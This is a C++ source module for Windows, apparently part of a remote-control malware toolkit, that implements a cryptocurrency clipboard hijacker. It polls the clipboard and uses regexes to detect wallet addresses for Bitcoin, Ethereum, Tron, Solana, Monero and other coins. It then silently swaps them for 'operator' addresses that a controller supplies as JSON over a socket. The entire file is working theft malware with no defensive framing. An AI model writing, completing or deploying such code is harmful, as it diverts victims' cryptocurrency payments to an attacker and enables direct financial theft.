#include "clipboard_monitor.h"
#include <string>
#include <map>
#include <regex>
#include <algorithm>
#include <mutex>
#include <sstream>

// ── Internal state ────────────────────────────────────────────────────────────
static SOCKET g_ClipperSock = INVALID_SOCKET;
static volatile bool g_ClipperRunning = false;
static HANDLE g_ClipperThread = NULL;
static std::mutex g_AddrMutex;
static std::map<std::string, std::string> g_Addresses; // coin -> operator address
static std::string g_LastClip;                          // dedup: skip if clipboard unchanged

// ── Coin detection patterns ──────────────────────────────────────────────────
// Each entry: { coin_key, regex_pattern }
struct CoinPattern {
    const char* coin;
    const char* pattern;
};

static CoinPattern COIN_PATTERNS[] = {
    // Bitcoin (legacy 1..., P2SH 3..., bech32 bc1...)
    { "BTC",  "^((?:bc1[a-z0-9]{39,59})|(?:[13][a-km-zA-HJ-NP-Z1-9]{25,34}))$" },
    // Ethereum / EVM (ETH, BNB, MATIC, etc.) — 0x + 40 hex
    { "ETH",  "^0x[a-fA-F0-9]{40}$" },
    // Tron
    { "TRX",  "^T[a-km-zA-HJ-NP-Z1-9]{33}$" },
    // Solana (base58, 32-44 chars)
    { "SOL",  "^[1-9A-HJ-NP-Za-km-z]{32,44}$" },
    // Litecoin (legacy L/M or bech32 ltc1)
    { "LTC",  "^((?:ltc1[a-z0-9]{39,59})|(?:[LM][a-km-zA-HJ-NP-Z1-9]{26,33}))$" },
    // Monero
    { "XMR",  "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$" },
    // Dogecoin
    { "DOGE", "^D[5-9A-HJ-NP-Za-km-z]{33}$" },
    // Ripple
    { "XRP",  "^r[0-9a-zA-Z]{24,34}$" },
    // Bitcoin Cash (cashaddr format)
    { "BCH",  "^(?:bitcoincash:)?[qp][0-9a-z]{41}$" },
};
static const int COIN_PATTERN_COUNT = sizeof(COIN_PATTERNS) / sizeof(COIN_PATTERNS[0]);

// Pre-compiled regexes (compiled once on thread start)
static std::vector<std::pair<std::string, std::regex>> g_CompiledPatterns;

// ── Simple JSON value extractor ──────────────────────────────────────────────
// Handles flat {"key":"value",...} without a full JSON library.
static std::map<std::string, std::string> ParseSimpleJson(const std::string& json) {
    std::map<std::string, std::string> result;
    size_t pos = 0;
    
    auto skipWS = [&]() { while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t' || json[pos] == '\n' || json[pos] == '\r')) pos++; };
    auto readString = [&]() -> std::string {
        if (pos >= json.size() || json[pos] != '"') return "";
        pos++; // skip opening quote
        std::string s;
        while (pos < json.size() && json[pos] != '"') {
            if (json[pos] == '\\' && pos + 1 < json.size()) { pos++; }
            s += json[pos++];
        }
        if (pos < json.size()) pos++; // skip closing quote
        return s;
    };

    skipWS(); if (pos < json.size() && json[pos] == '{') pos++;
    while (pos < json.size()) {
        skipWS();
        if (pos < json.size() && json[pos] == '}') break;
        // Read key
        std::string key = readString();
        skipWS(); if (pos < json.size() && json[pos] == ':') pos++;
        skipWS();
        std::string val = readString();
        if (!key.empty()) result[key] = val;
        skipWS(); if (pos < json.size() && json[pos] == ',') pos++;
    }
    return result;
}

// ── Clipboard helpers ─────────────────────────────────────────────────────────
static std::string GetClipboardText() {
    if (!OpenClipboard(NULL)) return "";
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) { CloseClipboard(); return ""; }
    char* pText = (char*)GlobalLock(hData);
    if (!pText) { CloseClipboard(); return ""; }
    std::string text(pText);
    GlobalUnlock(hData);
    CloseClipboard();
    return text;
}

static void SetClipboardText(const std::string& text) {
    if (!OpenClipboard(NULL)) return;
    EmptyClipboard();
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
    if (!hMem) { CloseClipboard(); return; }
    char* pMem = (char*)GlobalLock(hMem);
    if (pMem) {
        memcpy(pMem, text.c_str(), text.size() + 1);
        GlobalUnlock(hMem);
        SetClipboardData(CF_TEXT, hMem);
    }
    CloseClipboard();
}

// Trim whitespace from both ends of a string
static std::string Trim(const std::string& s) {
    size_t start = s.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    size_t end = s.find_last_not_of(" \t\r\n");
    return s.substr(start, end - start + 1);
}

// ── Main clipper loop ────────────────────────────────────────────────────────
DWORD WINAPI ClipperThreadProc(LPVOID /*lpParam*/) {
    // Compile all regex patterns once
    g_CompiledPatterns.clear();
    for (int i = 0; i < COIN_PATTERN_COUNT; i++) {
        try {
            g_CompiledPatterns.push_back({
                std::string(COIN_PATTERNS[i].coin),
                std::regex(COIN_PATTERNS[i].pattern, std::regex::ECMAScript)
            });
        } catch (...) {}
    }

    while (g_ClipperRunning) {
        Sleep(2000); // Poll every 2 seconds
        if (!g_ClipperRunning) break;

        // Grab clipboard
        std::string clip = Trim(GetClipboardText());
        if (clip.empty() || clip == g_LastClip) continue;
        g_LastClip = clip;

        // Check if any coin address pattern matches
        std::string matchedCoin;
        for (auto& [coin, rx] : g_CompiledPatterns) {
            if (std::regex_match(clip, rx)) {
                matchedCoin = coin;
                break;
            }
        }
        if (matchedCoin.empty()) continue;

        // Look up operator's address for this coin
        std::string replaceWith;
        {
            std::lock_guard<std::mutex> lock(g_AddrMutex);
            auto it = g_Addresses.find(matchedCoin);
            if (it == g_Addresses.end() || it->second.empty()) continue;
            replaceWith = it->second;
        }

        // Don't replace if the clipboard already contains our address
        if (clip == replaceWith) continue;

        // Replace!
        SetClipboardText(replaceWith);
        g_LastClip = replaceWith;
    }
    return 0;
}

// ── Public API ───────────────────────────────────────────────────────────────
void StartClipperThread(SOCKET sock) {
    g_ClipperSock = sock;
    g_ClipperRunning = true;
    g_LastClip.clear();
    g_ClipperThread = CreateThread(NULL, 0, ClipperThreadProc, NULL, 0, NULL);
}

void StopClipperThread() {
    g_ClipperRunning = false;
    if (g_ClipperThread) {
        WaitForSingleObject(g_ClipperThread, 3000);
        CloseHandle(g_ClipperThread);
        g_ClipperThread = NULL;
    }
}

void UpdateClipperAddresses(const std::string& jsonAddresses) {
    auto parsed = ParseSimpleJson(jsonAddresses);
    std::lock_guard<std::mutex> lock(g_AddrMutex);
    g_Addresses.clear();
    for (auto& [k, v] : parsed) {
        if (!v.empty()) {
            g_Addresses[k] = v;
        }
    }
}
